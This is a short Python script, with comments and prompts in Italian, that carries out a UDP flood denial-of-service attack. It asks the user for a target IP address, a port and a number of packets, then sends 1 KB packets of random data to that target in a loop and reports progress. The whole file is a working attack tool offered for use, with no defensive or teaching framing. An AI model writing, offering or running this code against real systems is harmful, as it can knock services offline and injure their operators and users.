import socket
import random
import ipaddress

def udp_flood():
    try:
        # Richiesta di input all'utente con validazione
        target_ip = input("Inserisci l'indirizzo IP della macchina target: ")
        try:
            ipaddress.ip_address(target_ip)  # Validazione indirizzo IP
        except ValueError:
            print("Errore: Indirizzo IP non valido.")
            return

        target_port = input("Inserisci il numero di porta UDP della macchina target: ")
        if not target_port.isdigit() or not (1 <= int(target_port) <= 65535):
            print("Errore: La porta deve essere un numero intero compreso tra 1 e 65535.")
            return
        target_port = int(target_port)

        num_packets = input("Inserisci il numero di pacchetti da inviare: ")
        if not num_packets.isdigit() or int(num_packets) <= 0:
            print("Errore: Il numero di pacchetti deve essere un intero positivo.")
            return
        num_packets = int(num_packets)

        packet_size = 1024  # Dimensione dei pacchetti in byte (1KB)

        # Creazione del socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        print(f"Inizio dell'attacco UDP flood su {target_ip}:{target_port}")

        # Creazione di un pacchetto di dati casuali
        packet = random._urandom(packet_size)  # Genera dati casuali della dimensione specificata

        for i in range(num_packets):
            sock.sendto(packet, (target_ip, target_port))  # Invio del pacchetto
            print(f"Pacchetto {i + 1}/{num_packets} inviato")

        print("Attacco completato.")
    except KeyboardInterrupt:
        print("Attacco interrotto dall'utente.")
    except Exception as e:
        print(f"Errore: {e}")
    finally:
        try:
            sock.close()
        except NameError:
            pass

if __name__ == "__main__":
    udp_flood()
